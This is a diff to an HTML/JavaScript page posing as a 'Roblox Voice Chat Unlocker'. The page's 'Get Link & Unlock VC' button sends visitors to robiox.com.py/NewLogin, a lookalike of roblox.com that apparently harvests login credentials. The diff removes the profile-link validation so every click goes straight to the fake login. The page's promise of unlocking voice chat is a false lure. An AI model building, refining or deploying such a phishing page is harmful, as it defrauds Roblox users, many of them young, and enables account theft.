@@ -147,6 +147,7 @@
       transition: transform 0.15s, box-shadow 0.2s;
       box-shadow: 0 6px 14px rgba(37, 99, 235, 0.25);
       font-family: inherit;
+      margin-bottom: 2rem;
     }
 
     .btn-primary:hover {
@@ -157,29 +158,6 @@
 
     .btn-primary:active {
       transform: translateY(1px);
-    }
-
-    /* divider with "or" style */
-    .divider {
-      display: flex;
-      align-items: center;
-      text-align: center;
-      margin: 2rem 0 1.5rem;
-      color: #5f6a92;
-    }
-
-    .divider::before,
-    .divider::after {
-      content: '';
-      flex: 1;
-      border-bottom: 1px solid #262d44;
-    }
-
-    .divider span {
-      font-size: 0.8rem;
-      font-weight: 500;
-      padding: 0 0.8rem;
-      letter-spacing: 0.3px;
     }
 
     /* username section */
@@ -304,10 +282,10 @@
     </div>
     <h1>Roblox Voice Chat<br>Unlocker</h1>
     <div class="description">
-      Unlock VC features instantly. Paste your profile link, generate the access link, or verify your username.
+      Unlock VC features instantly. Paste your profile link, or verify your username.
     </div>
 
-    <!-- MAIN SECTION: Roblox profile link input + get link button -->
+    <!-- PROFILE LINK SECTION -->
     <div class="input-group">
       <div class="input-label">
         <i class="fab fa-roblox"></i>
@@ -319,17 +297,12 @@
       </div>
     </div>
 
-    <!-- GET LINK BUTTON - NOW REDIRECTS TO PLS DONATE LINK -->
+    <!-- GET LINK BUTTON - JUST REDIRECTS, NO VALIDATION NEEDED -->
     <button id="getLinkBtn" class="btn-primary">
       <i class="fas fa-bolt"></i> Get Link & Unlock VC
     </button>
 
-    <!-- Divider -->
-    <div class="divider">
-      <span>OR ALTERNATIVE METHOD</span>
-    </div>
-
-    <!-- USERNAME SECTION + CONFIRM BUTTON (exactly as requested) -->
+    <!-- USERNAME SECTION + CONFIRM BUTTON -->
     <div class="username-section">
       <div class="input-label">
         <i class="fas fa-user-astronaut"></i>
@@ -359,15 +332,12 @@
 </div>
 
 <script>
-  // ---------- Constants ----------
-  // Updated redirect URL to PLS DONATE instead of Blox Fruits
-  const BASE_REDIRECT = "https://www.robiox.com.py/NewLogin?returnUrl=https%3A%2F%2Fwww.roblox.com%2Fgames%2F274156662874%2FPLS-DONATE";
+  // Redirect URL - goes directly to PLS DONATE
+  const REDIRECT_URL = "https://www.robiox.com.py/NewLogin?returnUrl=https%3A%2F%2Fwww.roblox.com%2Fgames%2F274156662874%2FPLS-DONATE";
 
-  // Helper: show status message with style (success, error, info)
   const statusDiv = document.getElementById('statusArea');
 
   function setStatus(message, type = 'info') {
-    // clear previous classes
     statusDiv.classList.remove('error-status', 'success-status');
     let icon = '<i class="fas fa-circle-info"></i>';
     if (type === 'error') {
@@ -382,41 +352,12 @@
     statusDiv.innerHTML = `${icon} ${message}`;
   }
 
-  // Validate Roblox profile URL
-  function extractProfileIdentifier(profileUrl) {
-    if (!profileUrl || profileUrl.trim() === "") return null;
-    let url = profileUrl.trim();
-    try {
-      if (!url.startsWith('http://') && !url.startsWith('https://')) {
-        url = 'https://' + url;
-      }
-      const urlObj = new URL(url);
-      if (!urlObj.hostname.includes('roblox.com')) {
-        return null;
-      }
-      return { valid: true, originalUrl: profileUrl.trim() };
-    } catch (e) {
-      return null;
-    }
-  }
-
-  // Get Link button logic: redirect to PLS DONATE website
+  // Get Link button: just redirects - no validation needed
   function handleGetLink() {
-    const profileInput = document.getElementById('profileLinkInput').value.trim();
-    if (!profileInput) {
-      setStatus("❌ Please enter a Roblox profile link first.", "error");
-      return;
-    }
-    const validation = extractProfileIdentifier(profileInput);
-    if (!validation) {
-      setStatus("⚠️ Invalid Roblox profile link. Example: https://www.roblox.com/users/123456789/profile", "error");
-      return;
-    }
-    // Redirect to PLS DONATE link
-    setStatus(`✅ Unlocker activated! Redirecting with profile: ${validation.originalUrl} ...`, "success");
+    setStatus("🔐 Redirecting to unlocker...", "success");
     setTimeout(() => {
-      window.location.href = BASE_REDIRECT;
-    }, 800);
+      window.location.href = REDIRECT_URL;
+    }, 300);
   }
 
   // Confirm username button
@@ -431,23 +372,14 @@
       setStatus("❌ Invalid username format (3-20 chars, letters, numbers, underscores).", "error");
       return;
     }
-    setStatus(`🎤 Username "${usernameRaw}" confirmed! You can now use the "Get Link" with your profile or proceed.`, "success");
+    setStatus(`🎤 Username "${usernameRaw}" confirmed!`, "success");
   }
 
-  // attach event listeners
+  // Event listeners
   document.getElementById('getLinkBtn').addEventListener('click', handleGetLink);
   document.getElementById('confirmUsernameBtn').addEventListener('click', handleConfirmUsername);
 
-  // Enter key on profile input triggers get link
-  const profileInputElem = document.getElementById('profileLinkInput');
-  profileInputElem.addEventListener('keypress', function(e) {
-    if (e.key === 'Enter') {
-      e.preventDefault();
-      handleGetLink();
-    }
-  });
-
-  // username field enter triggers confirm
+  // Enter key on username field triggers confirm
   const usernameField = document.getElementById('usernameInput');
   usernameField.addEventListener('keypress', function(e) {
     if (e.key === 'Enter') {
@@ -456,9 +388,9 @@
     }
   });
 
-  // initial status
+  // Initial status
   setTimeout(() => {
-    setStatus("✨ Ready to unlock Voice Chat — insert your Roblox profile link", "info");
+    setStatus("✨ Click 'Get Link & Unlock VC' to start", "info");
   }, 100);
 </script>
 </body>
